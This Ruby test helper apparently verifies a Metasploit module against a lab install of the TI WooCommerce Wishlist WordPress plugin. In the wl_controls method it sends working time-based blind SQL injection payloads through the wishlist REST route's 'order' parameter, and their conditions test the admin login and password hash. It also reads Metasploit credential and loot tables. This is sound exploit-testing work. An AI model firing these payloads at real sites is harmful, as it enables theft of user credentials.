# frozen_string_literal: true

require 'base64'
require 'digest'
require 'json'
require 'net/http'
require 'open3'
require 'uri'

# These controls use vendor HTTP/WordPress APIs independently of the module.
module TiWishlistNative
  def wl_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-ti-wishlist.json'), JSON.pretty_generate(@wl)) if @wl
  end

  def wl_command(label, role, *arguments, user: nil)
    argv = target_runtime.fetch('compose') + ['exec', '-T']
    argv += ['--user', user] if user
    argv += [role, 'timeout', '40', *arguments]
    output, error, status = Open3.capture3(*argv)
    @wl.fetch(:commands) << { label: label, argv: argv, stdout_base64: Base64.strict_encode64(output), stderr: error, exit: status.exitstatus }
    wl_save
    raise "Native wishlist command failed: #{label}: #{error}" unless status.success?

    output
  end

  def wl_identity(label)
    data = JSON.parse(wl_command(label, 'app', 'php', '/opt/module-target/control.php', user: 'www-data'))
    @wl.fetch(:identities) << { phase: label, data: data }
    wl_save
    expect(data.values_at('core', 'php', 'uid', 'database', 'role')).to eq(['6.8.3', '8.3.28', 33, 'wp_root', 'module_target@%'])
    expect(data.fetch('server')).to start_with('11.2.2-MariaDB')
    expect(data.fetch('grants').join("\n")).not_to include('ALL PRIVILEGES ON *.*', 'GRANT OPTION')
    expect(data.values_at('prefix', 'table_prefix', 'mode')).to eq([@prefix, ENV.fetch('TI_WISHLIST_TABLE_PREFIX', 'wp_'), @mode])
    if data.fetch('table_prefix') == 'wp_native_'
      expect(data.fetch('prefix_lookup')).to eq({ 'value' => 'wp_native_', 'byte5_gt127' => '0', 'byte5_gt96' => '1' })
    end
    expect(data.fetch('permalink_structure')).to eq(ENV['TI_WISHLIST_PLAIN'] == '1' ? '' : '/%postname%/')
    expect(data.values_at('db_error', 'bootstrap_output_base64')).to eq(['', ''])
    installed = @mode != 'absent'
    active = !%w[inactive absent].include?(@mode)
    expect(data.values_at('wishlist_installed', 'wishlist_active', 'wishlist_route', 'wishlist')).to eq([installed, active, active, installed ? @release : nil])
    expect(data.fetch('woocommerce')).to eq('9.3.3')
    plugins = ['woocommerce/woocommerce.php']
    plugins << 'ti-woocommerce-wishlist/ti-woocommerce-wishlist.php' if active
    expect(data.fetch('active_plugins').sort).to eq(plugins.sort)
    [['woocommerce', 'woocommerce', '9.3.3'], ['ti-woocommerce-wishlist', 'ti_wishlist', @release]].each do |slug, directory, version|
      catalog = JSON.parse(File.read("test/module_targets/#{directory}/releases.json")).fetch(version)
      expect(data.fetch('archive_sha256').fetch(slug)).to eq(catalog.fetch('sha256'))
      expect(data.fetch('installed_sha256').fetch(slug)).to eq(slug == 'ti-woocommerce-wishlist' && !installed ? {} : catalog.fetch('installed_sha256'))
    end
    expect(data.fetch('users').map { |row| row.fetch('user_login') }).to eq(%w[module_admin module_author module_subscriber module_editor])
    expect(data.fetch('users').all? { |row| row.fetch('user_pass').start_with?('$wp$2y$') && row.fetch('user_pass').bytesize == 63 }).to be(true)
    if @mode == 'no_products'
      expect(data.values_at('product', 'published_product_ids')).to eq([nil, []])
    else
      product = data.fetch('product')
      expect(product.values_at('name', 'status', 'type', 'price')).to eq(['Module target native wishlist product', 'publish', 'simple', '12.50'])
      expect(product.fetch('id')).to be_between(1, 100)
      expect(data.fetch('published_product_ids')).to eq([product.fetch('id')])
    end
    data
  end

  def wl_http(label, path, fields: nil, multipart: false)
    request = fields ? Net::HTTP::Post.new(path) : Net::HTTP::Get.new(path)
    if multipart
      boundary = 'module-target-native-wishlist-boundary'
      request['Content-Type'] = 'multipart/form-data; boundary=' + boundary
      request.body = fields.map { |key, value| "--#{boundary}\r\nContent-Disposition: form-data; name=\"#{key}\"\r\n\r\n#{value}\r\n" }.join + "--#{boundary}--\r\n"
    elsif fields
      request.set_form_data(fields)
    end
    request['Host'] = 'module-target.test'
    endpoint = target_endpoint('app')
    http = Net::HTTP.new(endpoint.fetch('host'), endpoint.fetch('port'), nil)
    http.open_timeout = 5
    http.read_timeout = 15
    http.max_retries = 0
    started = Process.clock_gettime(Process::CLOCK_MONOTONIC)
    response = http.request(request)
    @wl.fetch(:requests) << { label: label, method: request.method, path: path, fields: fields, request_body_base64: request.body && Base64.strict_encode64(request.body.b), code: response.code, headers: response.to_hash, body_base64: Base64.strict_encode64(response.body.to_s.b), seconds: Process.clock_gettime(Process::CLOCK_MONOTONIC) - started }
    wl_save
    response
  end

  def wl_resources(phase)
    %w[app db reporting_db].each do |role|
      %w[memory.events pids.events].each do |name|
        values = wl_command(phase + '-' + role + '-' + name, role, 'cat', '/sys/fs/cgroup/' + name).lines.to_h do |line|
          key, value = line.split
          [key, Integer(value)]
        end
        @wl.fetch(:resources) << { phase: phase, role: role, file: name, values: values }
        wl_save
        expect(values.values_at('oom', 'oom_kill')).to eq([0, 0]) if name == 'memory.events'
        expect(values.fetch('max')).to eq(0) if name == 'pids.events'
      end
    end
  end

  def wl_controls(phase)
    control = { phase: phase, mode: @mode, delay: @delay, status: 'started' }
    @wl.fetch(:controls) << control
    wl_save
    response = wl_http(phase + '-login', @prefix + '/wp-login.php')
    expect(response.code).to eq('200')
    expect(response.body).to include('name="log"', 'name="pwd"')
    expect(wl_http(phase + '-home', @prefix + '/').code).to eq('200')
    product = @baseline.fetch('product')
    if product
      uri = URI(product.fetch('permalink'))
      response = wl_http(phase + '-product', uri.request_uri)
      expect(response.code).to eq('200')
      expect(response.body).to include(product.fetch('name'))
    end
    identifier = product ? product.fetch('id') : 0
    response = wl_http(phase + '-add-product', @prefix + '/', fields: { 'tinv_wishlist_id' => '', 'product_id' => identifier.to_s, 'product_action' => 'addto' }, multipart: true)
    expect(response.code).to eq('200')
    if %w[inactive absent].include?(@mode)
      expect(response.body).to include('<html')
    else
      data = JSON.parse(response.body)
      if @mode == 'no_products'
        expect(data.dig('wishlists_data', 'products')).to eq([])
      else
        expect(data.dig('wishlists_data', 'products')).not_to be_empty
        share = data.fetch('wishlist').fetch('share_key')
        expect(share).to match(/\A[a-fA-F0-9]{6}\z/)
        user = @baseline.fetch('users').first
        prefix = @baseline.fetch('table_prefix')
        expect(prefix).to match(/\A[a-z_]+\z/)
        whole_row = user.fetch('user_login') + ';' + user.fetch('user_pass')
        conditions = { 'false' => '1=0', 'true' => '1=1', 'row-false' => "(SELECT CONCAT(user_login,0x3b,user_pass) FROM #{prefix}users ORDER BY ID LIMIT 1)=0x" + (whole_row + 'wrong').unpack1('H*'), 'row-true' => "(SELECT CONCAT(user_login,0x3b,user_pass) FROM #{prefix}users ORDER BY ID LIMIT 1)=0x" + whole_row.unpack1('H*') }
        pairs = [['true', 'false'], ['row-true', 'row-false']]
        if prefix == 'wp_native_'
          # Exercise the expensive lookup from the captured failure, as well as
          # a simple data query. Only the comparison threshold differs here.
          lookup = File.binread('test/module_targets/ti_wishlist/prefix-query.sql')
          conditions['prefix-false'] = "ord(mid(cast((#{lookup}) as binary),5,1))>127"
          conditions['prefix-true'] = "ord(mid(cast((#{lookup}) as binary),5,1))>96"
          pairs << ['prefix-true', 'prefix-false']
        end
        wl_query(phase + '-benign', share, 'ASC', identifier)
        timings = conditions.to_h { |label, _| [label, []] }
        3.times do |iteration|
          conditions.each do |label, condition|
            wl_query("#{phase}-#{label}-#{iteration}", share, ",(SELECT IF(#{condition},SLEEP(#{@delay}),0))-- ", identifier)
            timings.fetch(label) << @wl.fetch(:requests).last.fetch(:seconds)
          end
        end
        medians = timings.transform_values { |values| values.sort[1] }
        control.merge!(timings: timings, medians: medians, share_key: share)
        wl_save
        pairs.each do |positive, negative|
          gap = medians.fetch(positive) - medians.fetch(negative)
          if @vulnerable
            expect(gap).to be >= @delay - 0.1
            expect(timings.fetch(negative).max).to be < @delay - 0.1
            expect(timings.fetch(positive).min).to be >= @delay
          else
            expect(gap.abs).to be < 0.2
          end
        end
      end
    end
    wl_resources(phase)
    control[:status] = 'passed'
    wl_save
  end

  def wl_query(label, share, order, identifier)
    query = URI.encode_www_form('_method' => 'GET', 'order' => order)
    response = wl_http(label, @prefix + '/?' + query, fields: { 'rest_route' => "/wc/v3/wishlist/#{share}/get_products" })
    expect(response.code).to eq('200')
    rows = JSON.parse(response.body)
    expect(rows).to be_a(Array)
    expect(rows.map { |row| row.fetch('product_id') }).to eq([identifier])
  end

  def wl_sql(query)
    wl_command('reporting-sql', 'reporting_db', 'env', 'PGPASSWORD=module-target-framework-db-password', 'psql', '-h', '127.0.0.1', '-U', 'module_framework', '-d', 'module_targets', '-v', 'ON_ERROR_STOP=1', '-Atc', query)
  end

  def wl_workspace(name)
    expect(name).to match(/\Ati_wishlist_[0-9]+(?:_[a-z]+)?\z/)
    @wl[:workspace] = name
    expect(console_command("workspace -a #{name}")).to include(name)
  end

  def wl_reports
    workspace = @wl.fetch(:workspace)
    raise ArgumentError, 'Invalid wishlist workspace' unless workspace.match?(/\Ati_wishlist_[0-9]+(?:_[a-z]+)?\z/)

    credentials = JSON.parse(wl_sql(<<~SQL))
      SELECT coalesce(json_agg(row ORDER BY row.id),'[]'::json) FROM (
        SELECT c.id,p.username,secret.data AS private_data,secret.type AS private_type,secret.jtr_format,c.origin_type,
          o.module_full_name,s.id AS service_id,s.port,s.proto,s.name AS service,host(h.address::inet) AS address
        FROM metasploit_credential_cores c JOIN workspaces w ON w.id=c.workspace_id
        LEFT JOIN metasploit_credential_publics p ON p.id=c.public_id
        LEFT JOIN metasploit_credential_privates secret ON secret.id=c.private_id
        LEFT JOIN metasploit_credential_origin_services o ON o.id=c.origin_id AND c.origin_type='Metasploit::Credential::Origin::Service'
        LEFT JOIN services s ON s.id=o.service_id LEFT JOIN hosts h ON h.id=s.host_id WHERE w.name='#{workspace}'
      ) row
    SQL
    vulns = JSON.parse(wl_sql(<<~SQL))
      SELECT coalesce(json_agg(row ORDER BY row.id),'[]'::json) FROM (
        SELECT v.id,v.name,v.info,s.port,s.proto,host(h.address::inet) AS address FROM vulns v
        JOIN hosts h ON h.id=v.host_id JOIN workspaces w ON w.id=h.workspace_id
        LEFT JOIN services s ON s.id=v.service_id WHERE w.name='#{workspace}'
      ) row
    SQL
    loot = JSON.parse(wl_sql(<<~SQL))
      SELECT coalesce(json_agg(row ORDER BY row.id),'[]'::json) FROM (
        SELECT l.id,l.path,l.ltype,l.content_type,l.service_id,host(h.address::inet) AS address
        FROM loots l JOIN workspaces w ON w.id=l.workspace_id
        LEFT JOIN hosts h ON h.id=l.host_id WHERE w.name='#{workspace}'
      ) row
    SQL
    result = { 'credentials' => credentials, 'vulns' => vulns, 'loot' => loot }
    @wl.fetch(:reports) << { workspace: workspace, **result }
    wl_save
    result
  end
end
